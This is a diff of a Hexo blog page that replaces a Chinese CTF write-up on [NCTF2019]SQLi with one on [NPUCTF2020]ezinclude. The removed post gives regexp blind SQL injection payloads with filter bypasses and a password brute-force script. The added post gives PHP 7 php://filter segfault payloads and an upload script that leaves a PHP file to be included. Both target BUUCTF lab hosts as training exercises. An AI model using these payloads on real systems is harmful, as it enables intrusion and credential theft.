@@ -13,7 +13,7 @@
 
 
 
-<title>&#39;[NCTF2019]SQLi&#39; | Hexo</title>
+<title>&#39;[NPUCTF2020]ezinclude&#39; | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">&#39;[NCTF2019]SQLi&#39;</h1>
+            <h1 class="post-title">&#39;[NPUCTF2020]ezinclude&#39;</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">June 6, 2024&nbsp;&nbsp;21:19:01</a>
+                        Date: <a href="#">June 7, 2024&nbsp;&nbsp;22:00:34</a>
                         </span>
                     
                     
@@ -221,49 +221,40 @@
         </header>
 
         <div class="post-content">
-            <h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>源码泄露：</p>
-<p><img src="/../images/%5BNCTF2019%5DSQLi/1.png" alt="1"></p>
-<p>找到hint.php</p>
-<p>目的明确：</p>
-<p>只要密码是admin的密码就可以获得flag</p>
-<p>得到提示，这题过滤了好多关键字，只要password的密码等于admin的密码就能拿到flag了，但是怎么拿呢？看了dalao的wp才发现有regexp注入</p>
-<h3 id="regexp注入（正则注入）"><a href="#regexp注入（正则注入）" class="headerlink" title="regexp注入（正则注入）"></a>regexp注入（正则注入）</h3><p>这个注入方式呢相当于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1001.2101.3001.7020">布尔盲注</a>吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后^匹配e开头的password</p>
-<p><img src="/../images/%5BNCTF2019%5DSQLi/2.png" alt="2"></p>
-<p>再找个a开头的：没有</p>
-<p><img src="/../images/%5BNCTF2019%5DSQLi/3.png" alt="3"></p>
-<p>分析<br>回到题目里，提示给了串SQL语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+            <h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="/../images/%5BNPUCTF2020%5Dezinclude/2.png" alt="2"></p>
+<p>进去发现是用户名与密码错误</p>
+<p>F12发现提示：</p>
+<p><img src="/../images/%5BNPUCTF2020%5Dezinclude/3.png" alt="3"></p>
+<p>要md5name后的字符串等于pass，不知道pass，可以bp发现传送回来的东西有hash这个东西</p>
+<p>直接加入pass等于这个hash值得到：</p>
+<p><img src="/../images/%5BNPUCTF2020%5Dezinclude/4.png" alt="4"></p>
+<p>得到flflflflag.php这个文件。</p>
+<p>但是他会直接进到404.html文件</p>
+<p>然后就不会了；接着就是大佬的操作了：</p>
+<p>大佬看到了php的版本7.0.33，直接就是：</p>
+<h4 id="php7-segment-fault特性"><a href="#php7-segment-fault特性" class="headerlink" title="php7 segment fault特性"></a>php7 segment fault特性</h4><p>扫目录可得dir.php</p>
+<blockquote>
+<p>……扫不出来</p>
+</blockquote>
+<blockquote>
+<p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+</blockquote>
+<blockquote>
+<ul>
+<li>php &lt; 7.2<br>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</li>
+<li>php7 老版本通杀<br>php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</li>
+</ul>
+</blockquote>
+<p>嫖个脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">mode1 = &quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line">mode2 = &quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">url = &quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&quot;</span><br><span class="line"></span><br><span class="line">url = url + mode1</span><br><span class="line">payload = &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    &quot;file&quot;: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
 
-
-<p>想要猜解admin的密码需要用到admin，可是题目过滤掉了admin，但是我们能用其他方法绕过，让username&#x3D;\，将语句后面的单引号给转义掉，我们可以构造这样的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||sql;%00</span><br></pre></td></tr></table></figure>
-
-
-<p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p>
-<p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p>
-<p>放入原查询语句相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||sql;%00&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<p>即</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where sql;%00</span><br></pre></td></tr></table></figure>
-
-
-<p> 这时候就能利用正则进行注入了构建payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^x&quot;;%00</span><br></pre></td></tr></table></figure>
-
-
-<p>相当于</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span>&quot;^x&quot;;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
-
-<p>先用burpsuite跑一下（注意该一下爆破频率，不然429），看看正确与错误的情况，好写脚本跑<br><img src="/../images/%5BNCTF2019%5DSQLi/4.png" alt="4"></p>
-<p><img src="/../images/%5BNCTF2019%5DSQLi/5.png" alt="5"></p>
-<p>跑完后发现错误的话会有个js的弹窗出来，跑对了就没有 ，这里可以看到密码第一位是y（或Y，不区分大小写），以此写个python脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#buuctf web [NCTF2019]SQLi</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + &quot;_&quot;      #密码字典：小写字母和数字还有下划线</span><br><span class="line">pw = &quot;&quot;     #admin的密码</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">    for i in pw_fuzz:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;username&#x27;:&#x27;\\&#x27;,</span><br><span class="line">            &#x27;passwd&#x27;:&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;.format((pw+i))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        if &quot;alert&quot; not in res:</span><br><span class="line">            pw = pw + i</span><br><span class="line">            print(pw)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/%5BNCTF2019%5DSQLi/6.png" alt="6"></p>
-<p>交到密码获得flag：</p>
-<p><img src="/../images/%5BNCTF2019%5DSQLi/7.png" alt="7"></p>
+<p>访问dir.php：</p>
+<p><img src="/../images/%5BNPUCTF2020%5Dezinclude/5.png" alt="5"></p>
+<p>有个文件名，访问本地file&#x3D;&#x2F;tmp&#x2F;phpBWqZND</p>
+<p>该脚本写了一个php探针：直接bp访问该文件</p>
+<p>因为直接访问好像不能打开，会直接跳转到404.html文件里面，无法访问php探针。</p>
+<p><img src="/../images/%5BNPUCTF2020%5Dezinclude/1.png" alt="1"></p>
+<p>获取flag，完成撒花~~~~~~~~</p>
 
         </div>
 
@@ -278,7 +269,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/">http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/</a></span>
+                        <span><a href="http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/">http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/</a></span>
                     </p>
                 
                 
@@ -304,7 +295,7 @@
                     
                         <a href="/tags/buuctf/"># buuctf</a>
                     
-                        <a href="/tags/regexp%E6%B3%A8%E5%85%A5/"># regexp注入</a>
+                        <a href="/tags/php7-segment-fault%E7%89%B9%E6%80%A7/"># php7 segment fault特性</a>
                     
                         
                 </span>
@@ -317,10 +308,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/06/07/%5BNPUCTF2020%5Dezinclude/">'[NPUCTF2020]ezinclude'</a>
             
-            
-            <a class="next" rel="next" href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/">'[RootersCTF2019]I_<3_Flask'</a>
+            <a class="next" rel="next" href="/2024/06/06/%5BNCTF2019%5DSQLi/">'[NCTF2019]SQLi'</a>
             
         </section>
 
